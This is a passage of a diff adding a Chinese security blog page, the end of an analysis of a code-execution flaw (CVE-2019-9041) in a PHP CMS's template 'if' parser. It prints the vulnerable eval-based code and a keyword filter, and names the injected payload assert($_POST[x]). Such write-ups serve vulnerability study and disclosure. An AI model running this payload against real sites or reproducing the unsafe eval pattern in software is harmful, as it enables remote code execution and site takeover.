+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nx">parserPlugLoop</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserOtherLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
+   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserIfLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span> <span class="c1">// IF语句
+</span><span class="c1"></span>   <span class="nv">$zcontent</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parserNoLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">);</span>
+   <span class="k">return</span> <span class="nv">$zcontent</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>忘了没跟大家说，先是执行<code>inc/zzz_client.php</code>里面的模板解析函数，然后再进入我们刚才开始分析的地方</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/zzzphp161/12.png" alt=""></p>
+<p><code>parserIfLabel</code>这个函数开始正则匹配，然后把匹配到的语句做替换，最后<code>ifstr</code>的值为<code>assert($_POST[x]</code>最后加入eval的<code>$ifstr</code>函数执行，程序本身没有在这里做过滤一些危险的函数，导致任意代码执行。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span>
+<span class="k">function</span> <span class="nf">parserIfLabel</span><span class="p">(</span> <span class="nv">$zcontent</span> <span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/&#39;</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match_all</span><span class="p">(</span> <span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$zcontent</span><span class="p">,</span> <span class="nv">$matches</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">0</span> <span class="p">]</span> <span class="p">);</span>
+      <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$count</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+         <span class="nv">$out_html</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+         <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">1</span> <span class="p">][</span> <span class="nv">$i</span> <span class="p">];</span>
+         <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;&lt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;!=&#39;</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+         <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;mod&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+         <span class="nv">$ifstr1</span> <span class="o">=</span> <span class="nx">cleft</span><span class="p">(</span> <span class="nv">$ifstr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span> <span class="p">);</span>
+         <span class="k">switch</span> <span class="p">(</span> <span class="nv">$ifstr1</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="s1">&#39;=&#39;</span><span class="o">:</span>
+               <span class="nv">$ifstr</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">.</span> <span class="nv">$ifstr</span><span class="p">;</span>
+               <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="s1">&#39;{&#39;</span><span class="o">:</span>
+            <span class="k">case</span> <span class="s1">&#39;[&#39;</span><span class="o">:</span>
+               <span class="nv">$ifstr</span> <span class="o">=</span> <span class="s2">&#34;&#39;&#34;</span> <span class="o">.</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;=&#34;</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+               <span class="k">break</span><span class="p">;</span>
+         <span class="p">}</span>
+         <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;==&#39;</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+         <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;===&#39;</span><span class="p">,</span> <span class="s1">&#39;==&#39;</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+         <span class="o">@</span><span class="k">eval</span><span class="p">(</span> <span class="s1">&#39;if(&#39;</span> <span class="o">.</span> <span class="nv">$ifstr</span> <span class="o">.</span> <span class="s1">&#39;){$flag=&#34;if&#34;;}else{$flag=&#34;else&#34;;}&#39;</span> <span class="p">);</span>
+</code></pre></div><p>上面任意文件删除漏洞说到的影响了模板文件的功能，原因是在<code>txt_html</code>函数里面，因为开始编辑保存的时候它会把整个模板文件的内容传到上面的<code>getform</code>的函数，然后返回数据的时候用了下面的<code>txt_html</code>函数，一般模板文件里面会有一些类似<code>script</code>的字符但是这里过滤了<code> $s = preg_replace('/script/i', 'scr1pt', $s );</code>所以导致影响了这个编辑模板的功能，这样就很矛盾了。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// txt 转换到 html
+</span><span class="c1"></span><span class="k">function</span> <span class="nf">txt_html</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">)</span> <span class="p">{</span>    
+   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$s</span> <span class="p">)</span> <span class="k">return</span> <span class="nv">$s</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">// 数组处理
+</span><span class="c1"></span>      <span class="k">foreach</span> <span class="p">(</span> <span class="nv">$s</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span> <span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$string</span><span class="p">[</span> <span class="nv">$key</span> <span class="p">]</span> <span class="o">=</span> <span class="nx">txt_html</span><span class="p">(</span> <span class="nv">$value</span> <span class="p">);</span>
+      <span class="p">}</span>
+   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span>  <span class="nv">$s</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>        
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="c1">//array(&#34;&#39;&#34;=&gt;&#34;&amp;apos;&#34;,&#39;&#34;&#39;=&gt;&#34;&amp;quot;&#34;,&#39;&lt;&#39;=&gt; &#34;&amp;lt;&#34;,&#39;&gt;&#39;=&gt; &#34;&amp;gt;&#34;);     
+</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="nx">DB_TYPE</span> <span class="o">==</span> <span class="s1">&#39;access&#39;</span> <span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$s</span><span class="o">=</span> <span class="nx">toutf</span><span class="p">(</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;&amp;apos;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;&amp;quot;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&amp;lt;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&amp;gt;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+         <span class="nv">$s</span> <span class="o">=</span> <span class="nx">htmlspecialchars</span><span class="p">(</span> <span class="nv">$s</span><span class="p">,</span><span class="nx">ENT_QUOTES</span><span class="p">,</span><span class="s1">&#39;UTF-8&#39;</span> <span class="p">);</span>       
+      <span class="p">}</span>            
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>     
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="s1">&#39;scr1pt&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/＼.php/i&#39;</span><span class="p">,</span> <span class="s1">&#39;．php&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+       <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/ascii/i&#39;</span><span class="p">,</span> <span class="s1">&#39;asc11&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/eval/i&#39;</span> <span class="p">,</span> <span class="s1">&#39;eva1&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;┠&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;┼&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+      <span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$s</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><h1 id="0x06-结尾">0x06 结尾</h1>
+<p>最近总是拖延，本来这篇文章在上周就可以发布了。</p>
+<p>因为什么？理由总是比做的多。</p>
+<p>这套程序好像也可以申请cve，这种cve不要也罢，类似dedecms、phpcms、thinkPHP、dz这种才有意思。</p>
+<p>最近又从coding转到GitHub了，conding自从转移到腾讯之后一直都很炸。</p>
+<h1 id="0x07-参考">0x07 参考</h1>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9041">https://nvd.nist.gov/vuln/detail/CVE-2019-9041</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/seacms8.7-sql-injection-analysis/">
+            Seacms 8.7版本SQL注入分析
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/">
+            浅析PHP反序列化漏洞
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
